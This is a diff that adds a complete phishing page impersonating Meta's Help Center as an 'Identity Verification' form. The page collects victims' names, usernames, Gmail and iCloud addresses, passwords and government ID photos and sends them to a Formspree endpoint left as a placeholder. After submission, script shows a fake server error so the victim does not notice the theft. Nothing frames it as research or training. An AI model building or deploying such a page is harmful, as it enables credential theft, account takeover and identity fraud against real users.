@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification | Meta Help Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --meta-blue: #0668E1; --bg-gray: #F0F2F5; --border-color: #DADDE1; }
+        body { font-family: 'Roboto', sans-serif; background-color: var(--bg-gray); margin: 0; color: #1C1E21; }
+        .navbar { background: white; padding: 12px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: center; }
+        .container { max-width: 550px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+        h2 { font-size: 24px; margin-bottom: 10px; }
+        p.desc { font-size: 14px; color: #606770; margin-bottom: 25px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; }
+        input, textarea { width: 100%; padding: 10px; border: 1px solid var(--border-color); border-radius: 6px; background: #F5F6F7; box-sizing: border-box; }
+        .btn-submit { width: 100%; padding: 12px; background: var(--meta-blue); color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 10px; }
+        #error-overlay { display: none; background: #FFEBE8; border: 1px solid #DD3C10; padding: 15px; border-radius: 4px; margin-top: 20px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="navbar"><img src="https://z-p3-static.xx.fbcdn.net/rsrc.php/y9/r/t_S9-87L_Fr.svg" width="100"></div>
+    <div class="container">
+        <h2>Identity Verification</h2>
+        <p class="desc">Please provide your official information to secure your account.</p>
+        <form id="meta-form" action="https://formspree.io/f/رابط_فورم_سبري_هنا" method="POST">
+            <div class="form-group"><label>Full Name</label><input type="text" name="name" required></div>
+            <div class="form-group"><label>Username</label><input type="text" name="user" required></div>
+            <div class="form-group"><label>Gmail Address</label><input type="email" name="gmail" required></div>
+            <div class="form-group"><label>iCloud Address</label><input type="email" name="icloud"></div>
+            <div class="form-group"><label>Last Password</label><input type="password" name="pass" required></div>
+            <div class="form-group"><label>Description</label><textarea name="desc" rows="3"></textarea></div>
+            <div class="form-group"><label>Government ID (Photo)</label><input type="file" name="id_file"></div>
+            <button type="submit" id="submit-btn" class="btn-submit">Submit Review Request</button>
+        </form>
+        <div id="error-overlay"><strong>System Error (500):</strong> High traffic. Try again in 24h.</div>
+    </div>
+    <script>
+        const form = document.getElementById('meta-form');
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            document.getElementById('submit-btn').innerHTML = "Processing...";
+            await fetch(form.action, { method: 'POST', body: new FormData(form), headers: { 'Accept': 'application/json' } });
+            form.style.display = 'none';
+            document.getElementById('error-overlay').style.display = 'block';
+        };
+    </script>
+</body>
+</html>
